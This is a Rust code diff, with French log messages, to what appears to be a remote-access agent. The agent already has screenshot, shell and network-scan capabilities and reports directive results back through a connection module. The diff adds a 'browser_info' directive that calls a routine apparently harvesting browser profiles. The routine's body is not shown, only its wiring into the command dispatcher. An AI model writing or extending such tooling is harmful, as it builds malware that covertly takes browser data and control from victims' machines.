@@ -6,6 +6,7 @@ mod screenshot;
 mod shell;
 use rand::Rng;
 use tokio::task::JoinHandle;
+mod browser_info;
 
 #[tokio::main]
 async fn main() {
@@ -121,6 +122,28 @@ async fn main() {
                                     eprintln!("Erreur network_scan : {}", e);
                                     let _ = connexion::send_directive_status(
                                         "network_scan",
+                                        "error",
+                                        &format!("Erreur  : {:?}", e),
+                                    )
+                                    .await;
+                                }
+                            }
+                        }),
+                        "browser_info" => tokio::spawn(async {
+                            println!("Démarrage de récupération de profils");
+                            match browser_info::process_browser_profiles().await {
+                                Ok(_) => {
+                                    let _ = connexion::send_directive_status(
+                                        "browser_info",
+                                        "success",
+                                        "Terminé",
+                                    )
+                                    .await;
+                                }
+                                Err(e) => {
+                                    eprintln!("Erreur browser_info : {}", e);
+                                    let _ = connexion::send_directive_status(
+                                        "browser_info",
                                         "error",
                                         &format!("Erreur  : {:?}", e),
                                     )
